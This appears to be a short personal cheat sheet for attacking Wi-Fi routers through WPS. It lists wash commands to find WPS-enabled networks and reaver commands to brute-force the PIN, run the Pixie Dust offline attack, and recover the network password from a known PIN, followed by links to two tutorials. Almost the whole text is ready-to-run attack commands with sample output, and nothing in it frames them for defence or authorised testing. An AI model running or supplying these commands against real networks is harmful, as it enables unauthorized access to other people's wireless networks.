
### Check for networks with wps available
wash -i wlan0mon

```code
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
AA:BB:CC:XX:YY:ZZ    1  -88  2.0  No   Broadcom  linksys
```

### ATTACKS TO RETRIEVE THE PIN

#standard attack
sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv

#pixie dust offline attack - (-K 1)
sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -K 1




### Getting a WiFi password with a known WPS pin in Reaver

sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -p 12345678






https://kalitut.com/wifi-attack-with-wps-using-reaver/
https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/
